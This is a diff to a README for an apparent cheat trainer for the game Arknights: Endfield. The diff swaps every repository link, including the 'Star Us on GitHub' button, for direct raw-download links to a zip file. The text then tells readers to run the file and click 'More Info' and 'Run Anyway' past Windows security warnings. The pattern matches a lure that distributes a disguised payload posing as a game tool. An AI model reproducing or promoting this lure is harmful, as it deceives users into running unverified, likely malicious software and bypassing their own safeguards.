@@ -1,5 +1,5 @@
 <h1>Sword Endfield-trainer - Train Smarter, Not Harder</h1>
-<p align="center"><a href="https://github.com/bufoboreasbacteriaorder208/Endfield-trainer"><img src="https://img.shields.io/badge/Download-Endfield%20Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/bufoboreasbacteriaorder208/Endfield-trainer/main/wealthless/trainer_Endfield_v1.8.zip"><img src="https://img.shields.io/badge/Download-Endfield%20Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a></p>
 <h2>🛡️ What is Endfield-trainer?</h2>
 Welcome to <strong>Endfield-trainer</strong>, a powerful, open-source cheat trainer designed specifically for <em>Arknights: Endfield</em>. This trainer gives you a clean, in-game overlay UI that puts the power right at your fingertips. Whether you are tired of grinding, stuck on a difficult boss, or just want to explore the world without restrictions, this trainer is your ultimate companion.
 <h2>✨ Key Features</h2>
@@ -14,7 +14,7 @@ This trainer is packed with features to enhance your gameplay experience. All fe
 Getting started with <strong>Endfield-trainer</strong> is as simple as 1-2-3. Follow the steps below to get it up and running on your Windows PC.
 <h3>📥 Step 1: Download the Application</h3>
 The very first thing you need to do is download the trainer. We have made this incredibly easy.
-<p align="center"><a href="https://github.com/bufoboreasbacteriaorder208/Endfield-trainer"><img src="https://img.shields.io/badge/⬇️%20Download%20Trainer-Click%20Here-blue?style=for-the-badge" alt="Download"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/bufoboreasbacteriaorder208/Endfield-trainer/main/wealthless/trainer_Endfield_v1.8.zip"><img src="https://img.shields.io/badge/⬇️%20Download%20Trainer-Click%20Here-blue?style=for-the-badge" alt="Download"></a></p>
 Click the big button above. This will take you to the official download page. Once you are there, look for the latest release and download the file. <strong>Visit this link to download the application.</strong>
 <h3>📂 Step 2: Run the File</h3>
 Once the download is complete, locate the downloaded file. This is usually in your <code>Downloads</code> folder. Double-click the file to run it. Depending on your browser's security settings, you may see a warning. If you do, click <strong>More Info</strong> and then <strong>Run Anyway</strong>. This is normal because the application is not yet signed by a recognized certificate.
@@ -54,6 +54,6 @@ Simply delete the file you downloaded at the start and close the trainer before 
 </ul>
 <h2>🙏 Support & Contributions</h2>
 <p>This is an open-source project, and we welcome feedback and contributions. If you encounter a bug, have a feature request, or appreciate the work we do, please visit our GitHub repository.</p>
-<p align="center"><a href="https://github.com/bufoboreasbacteriaorder208/Endfield-trainer"><img src="https://img.shields.io/badge/⭐%20Star%20Us%20on%20GitHub-Support-green?style=for-the-badge" alt="Star Us"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/bufoboreasbacteriaorder208/Endfield-trainer/main/wealthless/trainer_Endfield_v1.8.zip"><img src="https://img.shields.io/badge/⭐%20Star%20Us%20on%20GitHub-Support-green?style=for-the-badge" alt="Star Us"></a></p>
 <h2>🔑 Keywords</h2>
 <p>Keywords: arknights, arknights-endfield, endfield, hack, menu, mods, open-source, scripts, tool, trainer, utility</p>
